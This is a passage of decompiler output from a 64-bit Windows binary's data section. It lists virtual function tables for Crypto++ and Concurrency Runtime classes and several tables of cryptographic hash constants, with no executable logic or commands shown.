  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F102A70,
  &sub_13F1024C0,
  &sub_13F129230,
  &sub_13F129350,
  &sub_13F1293D0,
  &sub_13F129270,
  &sub_13F1292E0,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &CryptoPP::OutputProxy::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1871A8[4])() =
{
  &sub_13F129188,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::ProxyFilter::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1871C8[62])() =
{
  &sub_13F1030D0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F102F80,
  &sub_13F102FA0,
  &sub_13F129AC0,
  &sub_13F1299E0,
  &sub_13F102490,
  &sub_13F1298B0,
  &sub_13F1295C0,
  &sub_13F129C10,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &sub_13F102FC0,
  &sub_13F102FD0,
  &sub_13F102FE0,
  &sub_13F102FF0,
  &sub_13F103000,
  &guard_check_icall_nop,
  &sub_13F15E670,
  &guard_check_icall_nop,
  &sub_13F129DE0,
  &sub_13F129D60,
  &sub_13F15E670,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &CryptoPP::ProxyFilter::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F1873B8[3])() = { &sub_13F1083EC, &sub_13F1103A0, &sub_13F110450 }; // weak
void *CryptoPP::AlgorithmParameters::`vftable' = &sub_13F12AAB0; // weak
__int64 qword_13F187600 = 6578512i64; // weak
__int64 qword_13F1876B0[24] =
{
  8158064640682241944i64,
  -1606136187322303537i64,
  6480981066509632091i64,
  -6116909922501295452i64,
  1334009978109274776i64,
  6128411470023722430i64,
  -9160688885620122252i64,
  -4495734319865919833i64,
  -1171420208383170111i64,
  2597628982895680966i64,
  5365058922554666095i64,
  8573033837115779548i64,
  -6327057827470880430i64,
  -4658551843909851192i64,
  -3051310485054944269i64,
  1452737877275992913i64,
  3322285675184065157i64,
  5996557280394112508i64,
  8532644243977171796i64,
  -7894198244907759314i64,
  -6333637450904115039i64,
  -4076793798895891600i64,
  -2983346522951587815i64,
  1182934259129529733i64
}; // weak
__int64 qword_13F187770[88] =
{
  2177327726902690070i64,
  3796741972107491148i64,
  5681478165690322099i64,
  7507060719877933647i64,
  8693463986056692462i64,
  -8302665152423495660i64,
  -6606660894350966790i64,
  -4147400797850065929i64,
  4794697086780616226i64,
  8158064640168781261i64,
  -5349999486874862801i64,
  -1606136188198331460i64,
  4131703408338449720i64,
  6480981068601479193i64,
  -7908458776815382629i64,
  -6116909921290321640i64,
  -2880145864133508542i64,
  1334009975649890238i64,
  2608012711638119052i64,
  6128411473006802146i64,
  8268148722764581231i64,
  -9160688886553864527i64,
  -7215885187991268811i64,
  -4495734319001033068i64,
  -1973867731355612462i64,
  -1171420211273849373i64,
  1135362057144423861i64,
  2597628984639134821i64,
  3308224258029322869i64,
  5365058923640841347i64,
  6679025012923562964i64,
  8573033837759648693i64,
  -7476448914759557205i64,
  -6327057829258317296i64,
  -5763719355590565569i64,
  -4658551843659510044i64,
  -4116276920077217854i64,
  -3051310485924567259i64,
  489312712824947311i64,
  1452737877330783856i64,
  2861767655752347644i64,
  3322285676063803686i64,
  5560940570517711597i64,
  5996557281743188959i64,
  7280758554555802590i64,
  8532644243296465576i64,
  -9096487096722542874i64,
  -7894198246740708037i64,
  -6719396339535248540i64,
  -6333637450476146687i64,
  -4446306890439682159i64,
  -4076793802049405392i64,
  -3345356375505022440i64,
  -2983346525034927856i64,
  -860691631967231958i64,
  1182934255886127544i64,
  1847814050463011016i64,
  2177327727835720531i64,
  2830643537854262169i64,
  3796741975233480872i64,
  4115178125766777443i64,
  5681478168544905931i64,
  6601373596472566643i64,
  7507060721942968483i64,
  8399075790359081724i64,
  8693463985226723168i64,
  -8878714635349349518i64,
  -8302665154208450068i64,
  -8016688836872298968i64,
  -6606660893046293015i64,
  -4685533653050689259i64,
  -4147400797238176981i64,
  -3880063495543823972i64,
  -3348786107499101689i64,
  -1523767162380948706i64,
  -757361751448694408i64,
  500013540394364858i64,
  748580250866718886i64,
  1242879168328830382i64,
  1977374033974150939i64,
  2944078676154940804i64,
  3659926193048069267i64,
  4368137639120453308i64,
  4836135668995329356i64,
  5532061633213252278i64,
  6448918945643986474i64,
  6902733635092675308i64,
  7801388544844847127i64
}; // weak
__int128 xmmword_13F187A38 = 0xA54FF53A3C6EF372BB67AE856A09E667i64; // weak
__int128 xmmword_13F187A48 = 0x5BE0CD191F83D9AB9B05688C510E527Fi64; // weak
__int128 xmmword_13F187A60 = 0xC0D0E0F08090A0B0405060700010203i64; // weak
void *CryptoPP::ByteQueue::`vftable' = &sub_13F131610; // weak
__int64 (__fastcall *off_13F187DF0[3])() = { &sub_13F131600, &sub_13F1103A0, &sub_13F110450 }; // weak
void *CryptoPP::HashInputTooLong::`vftable' = &sub_13F1015C0; // weak
void *CryptoPP::RandomPool::`vftable' = &sub_13F132EA0; // weak
__int64 (__fastcall *off_13F187FB8[25])() =
{
  &sub_13F132F50,
  &sub_13F133010,
  &sub_13F132FD0,
  &sub_13F12F250,
  &sub_13F132A20,
  &sub_13F1327B0,
  &sub_13F1021F0,
  &sub_13F132850,
  &sub_13F104410,
  &sub_13F1047A0,
  &sub_13F1047E0,
  &sub_13F1043C0,
  &sub_13F102240,
  &sub_13F1022E0,
  &sub_13F102330,
  &sub_13F132860,
  &sub_13F1023D0,
  &sub_13F1117D0,
  &sub_13F102420,
  &sub_13F133350,
  &sub_13F1021E0,
  &sub_13F133200,
  &sub_13F12F390,
  &sub_13F104790,
  &loc_13F133360
}; // weak
void *CryptoPP::Timer::`vftable' = &sub_13F140020; // weak
__int64 (__fastcall *off_13F1880A8[16])() =
{
  &sub_13F1054C0,
  &sub_13F104400,
  &sub_13F104410,
  &sub_13F104400,
  &sub_13F1043D0,
  &sub_13F1020C0,
  &sub_13F110EC0,
  &sub_13F1043C0,
  &sub_13F1024C0,
  &sub_13F102140,
  &sub_13F102140,
  &sub_13F102170,
  &sub_13F1103D0,
  &sub_13F102470,
  &sub_13F12CDE4,
  &qword_13F1A66D8
}; // weak
void *off_13F188128[11] =
{
  &loc_13F10847C,
  &sub_13F1042D0,
  &sub_13F104380,
  &sub_13F12B874,
  &sub_13F12BE64,
  &sub_13F104400,
  &sub_13F12BE34,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &sub_13F1021E0,
  &sub_13F12B3C4
}; // weak
void *CryptoPP::AlgorithmParametersTemplate<bool>::`vftable' = &sub_13F106050; // weak
__int64 (__fastcall *off_13F1884F0[46])() =
{
  &sub_13F105950,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F104C20,
  &sub_13F1024A0,
  &sub_13F104CA0,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F110580,
  &sub_13F10FFA0,
  &sub_13F110670,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F102A70,
  &sub_13F1024C0,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &CryptoPP::StringSinkTemplate<std::string>::`RTTI Complete Object Locator'
}; // weak
void *off_13F188660[4] =
{
  &loc_13F108518,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F188680[53])() =
{
  &sub_13F103560,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F104C00,
  &sub_13F1024A0,
  &sub_13F104BF0,
  &sub_13F102490,
  &sub_13F104C00,
  &sub_13F1298B0,
  &sub_13F1295C0,
  &sub_13F129C10,
  &sub_13F104AB0,
  &sub_13F104AA0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F104C00,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F104C00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &sub_13F104B90,
  &sub_13F104B40,
  &sub_13F104B00,
  &sub_13F104AC0,
  &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`RTTI Complete Object Locator'
}; // weak
void *off_13F188828[4] =
{
  &loc_13F10844C,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::StringSource::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F188848[53])() =
{
  &sub_13F103560,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F104C00,
  &sub_13F1024A0,
  &sub_13F104BF0,
  &sub_13F102490,
  &sub_13F104C00,
  &sub_13F1298B0,
  &sub_13F1295C0,
  &sub_13F129C10,
  &sub_13F104AB0,
  &sub_13F104AA0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F104C00,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F104C00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &sub_13F104B90,
  &sub_13F104B40,
  &sub_13F104B00,
  &sub_13F104AC0,
  &CryptoPP::StringSource::`RTTI Complete Object Locator'
}; // weak
void *off_13F1889F0[4] =
{
  &loc_13F10844C,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::ECPPoint::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F188A10[2])() = { &sub_13F134C60, &CryptoPP::EC2NPoint::`RTTI Complete Object Locator' }; // weak
__int64 (__fastcall *off_13F188A20[2])() = { &sub_13F134C20, &CryptoPP::BaseN_Decoder::`RTTI Complete Object Locator' }; // weak
__int64 (__fastcall *off_13F188A30[50])() =
{
  &sub_13F103B30,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F12EC20,
  &sub_13F1024A0,
  &sub_13F12E630,
  &sub_13F102490,
  &sub_13F102490,
  &sub_13F1298B0,
  &sub_13F104DE0,
  &sub_13F129C10,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F1105F0,
  &sub_13F10FA20,
  &sub_13F1102D0,
  &sub_13F110270,
  &sub_13F1108C0,
  &sub_13F110860,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F12A990,
  &sub_13F129450,
  &sub_13F10FAF0,
  &sub_13F10FC80,
  &sub_13F10FD20,
  &sub_13F104D10,
  &sub_13F10FC00,
  &sub_13F110F70,
  &sub_13F1021D0,
  &sub_13F1291E0,
  &sub_13F1291E0,
  &sub_13F129580,
  &sub_13F10FA70,
  &sub_13F129D20,
  &sub_13F1021D0,
  &sub_13F1021D0,
  &sub_13F102490,
  &CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F188BC0[2])() = { &sub_13F1015C0, &sub_13F1015B0 }; // weak
__int64 qword_13F188FA0[2] = { 1020915264011641136i64, 5633897666314755i64 }; // weak
void *CryptoPP::MessageQueue::`vftable' = &sub_13F13C690; // weak
__int64 (__fastcall *off_13F1891F8[3])() = { &sub_13F13C678, &sub_13F1103A0, &sub_13F110450 }; // weak
int dword_13F189234 = 2; // weak
__int128 xmmword_13F189260 = 0x1000000000000000000000000000000i64; // weak
__int64 qword_13F189270[32] =
{
  -4220035636625179549i64,
  8551165804142854448i64,
  -1132837848873336118i64,
  -4579416878213835603i64,
  -3677401068916703817i64,
  1527239732556571956i64,
  -7348302183887812860i64,
  8480884942362907143i64,
  -6892075217054825719i64,
  -8921662568547337390i64,
  6607339346674635091i64,
  -3505968428227835030i64,
  -8848643888472461360i64,
  -6296247437614712507i64,
  -776697682927246511i64,
  -3245970461651454276i64,
  1676631399527025869i64,
  8293762873889302468i64,
  -8606332558691565216i64,
  -2662930446736101818i64,
  6639438661424919264i64,
  8783309624937599938i64,
  -6246820829716821785i64,
  625571976403244652i64,
  -4128492318428399430i64,
  -8463462944364765720i64,
  1078052770297495152i64,
  -7053268657013050015i64,
  -7742011664113272607i64,
  -2366547257013625189i64,
  7512820836647674252i64,
  1637996004624931137i64
}; // weak
__int64 qword_13F189370[32] =
{
  4081728220648048978i64,
  -299503112159018817i64,
  -8647140414576794756i64,
  -3753223879896363468i64,
  4405578879567428436i64,
  5675655116986076398i64,
  -5610120468253037048i64,
  2725112551038933878i64,
  1628166191723247730i64,
  -7874995444875746092i64,
  -2685854030520356756i64,
  -8890794339496225442i64,
  780174469957933200i64,
  451964940565669111i64,
  148407451943578832i64,
  7749027003923017665i64,
  -1523228983866322630i64,
  8351561505360048791i64,
  -8847974684672349034i64,
  7989233030994065890i64,
  -8519357913673043641i64,
  1999062403263936367i64,
  2340133230503417596i64,
  -839132460997354598i64,
  3586843909787540767i64,
  6912040434593174193i64,
  957776992592154976i64,
  -1180847366404905683i64,
  -5695599225631678304i64,
  7032744116240509896i64,
  2798555861319166743i64,
  9010613605079738849i64
}; // weak
__int64 qword_13F189470[8] =
{
  144115188092633088i64,
  576460752370532352i64,
  2305843009482129408i64,
  -9223372035781033984i64,
  3891110078501093376i64,
  7236556120496629875i64,
  1886413614i64,
  0i64
}; // weak
__int128 xmmword_13F1894B0 = 0x102030405060708090A0B0C0D0E0Fi64; // weak
__int128 xmmword_13F1894C0 = 0x3020100070605040B0A09080F0E0D0Ci64; // weak
__int128 xmmword_13F1894D0 = 0xF0E0D0C0B0A09080706050403020100i64; // weak
void *type_info::`vftable' = &sub_13F140894; // weak
__int64 (__fastcall *off_13F189C90[2])() = { &sub_13F101480, &sub_13F101460 }; // weak
void *Concurrency::improper_lock::`vftable' = &sub_13F101480; // weak
void *Concurrency::scheduler_resource_allocation_error::`vftable' = &sub_13F142194; // weak
void *Concurrency::scheduler_worker_creation_error::`vftable' = &sub_13F142194; // weak
__int64 (__fastcall *off_13F189DE8[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::improper_scheduler_attach::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189E00[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::improper_scheduler_reference::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189E18[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::context_unblock_unbalanced::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189E30[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::context_self_unblock::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189E48[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::missing_wait::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189E60[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::invalid_scheduler_policy_key::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189E78[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::invalid_scheduler_policy_value::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189E90[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::invalid_scheduler_policy_thread_specification::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189EA8[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::nested_scheduler_missing_detach::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189EC0[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::invalid_oversubscribe_operation::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F189ED8[2])() = { &sub_13F101480, &sub_13F101460 }; // weak
void *Concurrency::invalid_operation::`vftable' = &sub_13F101480; // weak
__int64 (__fastcall *off_13F18A188[3])() =
{
  &sub_13F1453A8,
  &sub_13F145398,
  &Concurrency::details::GlobalNode::TopologyObject::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A1A0[6])() =
{
  &sub_13F1453FC,
  &sub_13F1453A0,
  &sub_13F1454B8,
  &sub_13F145374,
  &sub_13F14537C,
  &Concurrency::details::ResourceManager::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A1D0[6])() =
{
  &sub_13F1469A0,
  &sub_13F146A14,
  &sub_13F1469B0,
  &sub_13F1451AC,
  &sub_13F14538C,
  &guard_check_icall_nop
}; // weak
void *Concurrency::ScheduleGroup::`vftable' = &sub_13F15E670; // weak
__int64 (__fastcall *off_13F18A568[14])() =
{
  &sub_13F14843C,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &Concurrency::details::_Chore::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A5D8[2])() =
{
  &sub_13F14849C,
  &Concurrency::details::RealizedChore::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A5E8[2])() =
{
  &sub_13F1483E4,
  &Concurrency::details::SchedulerBase::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A5F8[25])() =
{
  &sub_13F148468,
  &sub_13F14A2FC,
  &sub_13F1451AC,
  &sub_13F14A020,
  &sub_13F14B1A0,
  &sub_13F14B36C,
  &sub_13F14B22C,
  &sub_13F14891C,
  &sub_13F1490E8,
  &sub_13F1490F0,
  &sub_13F14BC10,
  &sub_13F14BB98,
  &sub_13F14AB18,
  &sub_13F15E670,
  &sub_13F14BCC8,
  &sub_13F14B0D8,
  &sub_13F15E670,
  &guard_check_icall_nop,
  &sub_13F14C4BC,
  &sub_13F14A880,
  &sub_13F1491F8,
  &sub_13F148A50,
  &sub_13F1021D0,
  &sub_13F15E670,
  &Concurrency::details::CacheLocalScheduleGroupSegment::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A6C0[5])() =
{
  &sub_13F148384,
  &sub_13F159E24,
  &sub_13F159CE8,
  &sub_13F14A0A4,
  &Concurrency::details::CacheLocalScheduleGroup::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A6E8[11])() =
{
  &sub_13F159714,
  &loc_13F14A2F8,
  &sub_13F14B188,
  &sub_13F14B314,
  &sub_13F148358,
  &sub_13F159198,
  &sub_13F159DDC,
  &sub_13F1595C0,
  &sub_13F148800,
  &sub_13F158D14,
  &Concurrency::details::FairScheduleGroupSegment::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A740[5])() =
{
  &sub_13F148384,
  &guard_check_icall_nop,
  &sub_13F159CE8,
  &sub_13F14A0A4,
  &Concurrency::details::FairScheduleGroup::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A768[10])() =
{
  &sub_13F159714,
  &loc_13F14A2F8,
  &sub_13F14B188,
  &sub_13F14B314,
  &sub_13F1483B8,
  &sub_13F159F64,
  &sub_13F14AB7C,
  &sub_13F14B940,
  &sub_13F14888C,
  &sub_13F159F30
}; // weak
void *Concurrency::details::WaitBlock::`vftable' = &sub_13F15E670; // weak
__int64 (__fastcall *off_13F18A958[6])() =
{
  &sub_13F14CD6C,
  &byte_13F14CAE0,
  &byte_13F14CAE0,
  &sub_13F1021D0,
  &byte_13F14CAE0,
  &Concurrency::details::MultiWaitBlock::`RTTI Complete Object Locator'
}; // weak
void (__fastcall __noreturn *off_13F18A988[7])() =
{
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F14CF60,
  &Concurrency::details::WaitAllBlock::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A9C0[7])() =
{
  &sub_13F14CE74,
  &sub_13F14CD2C,
  &sub_13F14CB08,
  &sub_13F14D114,
  &sub_13F14D0B4,
  &sub_13F14CF60,
  &Concurrency::details::WaitAnyBlock::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18A9F8[7])() =
{
  &sub_13F14CEC0,
  &byte_13F14CAE0,
  &guard_check_icall_nop,
  &sub_13F14D158,
  &byte_13F14CAE0,
  &sub_13F14CF60,
  &Concurrency::details::TimedSingleWaitBlock::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18AA30[6])() =
{
  &sub_13F14CDC0,
  &byte_13F14CAE0,
  &sub_13F14CAE4,
  &sub_13F14D0F0,
  &byte_13F14CAE0,
  &Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18AA60)() = &sub_13F14CA8C; // weak
void *Concurrency::Context::`vftable' = &sub_13F15E670; // weak
__int64 (__fastcall *off_13F18ABC8[18])() =
{
  &sub_13F14E9A0,
  &sub_13F15E670,
  &sub_13F14E9B8,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F14DF44,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F14E82C,
  &sub_13F14E838,
  &sub_13F14E844,
  &sub_13F14E850,
  &sub_13F14E98C,
  &sub_13F15E670
}; // weak
__int64 qword_13F18ADF0[19] =
{
  4294967296i64,
  12884901890i64,
  21474836484i64,
  4294967297i64,
  17179869186i64,
  21474836484i64,
  8589934594i64,
  17179869186i64,
  21474836484i64,
  17179869187i64,
  12884901892i64,
  21474836484i64,
  17179869188i64,
  17179869188i64,
  21474836484i64,
  21474836485i64,
  21474836485i64,
  21474836485i64,
  5353642784i64
}; // weak
__int64 (__fastcall *off_13F18AE88[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &Concurrency::details::_RefCounter::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18AEA0[3])() =
{
  &sub_13F14F8A8,
  &sub_13F1502B8,
  &Concurrency::details::_CancellationTokenRegistration::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18AEB8[4])() =
{
  &sub_13F14F850,
  &sub_13F1502B8,
  &sub_13F15E670,
  &Concurrency::details::CancellationTokenRegistration_TaskProc::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18AED8[4])() =
{
  &sub_13F14F7F8,
  &sub_13F1502B8,
  &sub_13F1502D8,
  &Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`RTTI Complete Object Locator'
}; // weak
__int64 qword_13F18AEF8[7] =
{
  5353306020i64,
  7308345369373991763i64,
  431349123954i64,
  8458725949284311373i64,
  133467960865394i64,
  8458725949283658061i64,
  133467960865394i64
}; // weak
void *Concurrency::details::ExecutionResource::`vftable' = &sub_13F151060; // weak
void *Concurrency::details::SchedulerProxy::`vftable' = &sub_13F152E3C; // weak
void *Concurrency::details::FreeThreadProxy::`vftable' = &sub_13F15BE04; // weak
void (__fastcall __noreturn *off_13F18B5A8[6])() =
{
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F15E670,
  &sub_13F153958
}; // weak
__int64 qword_13F18B5D8[2] = { 274877906944i64, 4398046511360i64 }; // weak
int *off_13F18B5E8 = &Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`RTTI Complete Object Locator'; // weak
void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable' = &sub_13F153CCC; // weak
char byte_13F18B648 = ''; // weak
__int64 qword_13F18B698[4] =
{
  5565127208486737827i64,
  3412011650856022462i64,
  4773376128703351421i64,
  3078698959804233874i64
}; // weak
void *Concurrency::details::VirtualProcessor::`vftable' = &sub_13F154478; // weak
__int64 qword_13F18B900[49] =
{
  137438953488i64,
  274877906992i64,
  412316860496i64,
  549755814000i64,
  687194767504i64,
  824633721008i64,
  962072674512i64,
  1099511628016i64,
  1236950581520i64,
  1374389535024i64,
  1511828488528i64,
  1649267442032i64,
  1786706395536i64,
  1924145349040i64,
  2061584302544i64,
  2199023256048i64,
  2473901163040i64,
  2748779070048i64,
  3023656977056i64,
  3298534884064i64,
  3573412791072i64,
  3848290698080i64,
  4123168605088i64,
  4398046512096i64,
  4947802326080i64,
  5497558140096i64,
  6047313954112i64,
  6597069768128i64,
  7146825582144i64,
  7696581396160i64,
  8246337210176i64,
  8796093024192i64,
  9895604652160i64,
  10995116280192i64,
  12094627908224i64,
  13194139536256i64,
  14293651164288i64,
  15393162792320i64,
  16492674420352i64,
  17592186048384i64,
  19791209304320i64,
  21990232560384i64,
  24189255816448i64,
  26388279072512i64,
  28587302328576i64,
  30786325584640i64,
  32985348840704i64,
  35184372096768i64,
  35184372088836i64
}; // weak
void *Concurrency::IExecutionContext::`vftable' = &sub_13F15E670; // weak
void *off_13F18BBB0[10] =
{
  &loc_13F14A2F8,
  &sub_13F156AAC,
  &sub_13F156AA4,
  &sub_13F157050,
  &sub_13F1565FC,
  &sub_13F1560A0,
  &sub_13F15651C,
  &sub_13F156F6C,
  &guard_check_icall_nop,
  &Concurrency::details::InternalContextBase::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F18BC00[18])() =
{
  &sub_13F156A98,
  &sub_13F156AC0,
  &sub_13F14E9B8,
  &sub_13F1575D4,
  &sub_13F156CC8,
  &sub_13F156060,
  &sub_13F15634C,
  &sub_13F1578DC,
  &sub_13F1570C0,
  &sub_13F156E7C,
  &sub_13F1562DC,
  &sub_13F156A30,
  &sub_13F14E82C,
  &sub_13F14E838,
  &sub_13F14E844,
  &sub_13F14E850,
  &sub_13F14E98C,
  &sub_13F15E670
}; // weak
void *Concurrency::details::ScheduleGroupSegmentBase::`vftable' = &sub_13F158554; // weak
__int64 (__fastcall *off_13F18BE88[10])() =
{
  &sub_13F159714,
  &loc_13F14A2F8,
  &sub_13F14B188,
  &sub_13F14B314,
  &sub_13F148358,
  &sub_13F159198,
  &sub_13F15E670,
  &sub_13F1595C0,
  &sub_13F15E670,
  &sub_13F158D14
}; // weak
void *Concurrency::details::ExternalContextBase::`vftable' = &sub_13F14E9A0; // weak
void *Concurrency::IScheduler::`vftable' = &sub_13F15E670; // weak
void *off_13F18C0B0[10] =
{
  &loc_13F14A2F8,
  &sub_13F156AAC,
  &sub_13F156AA4,
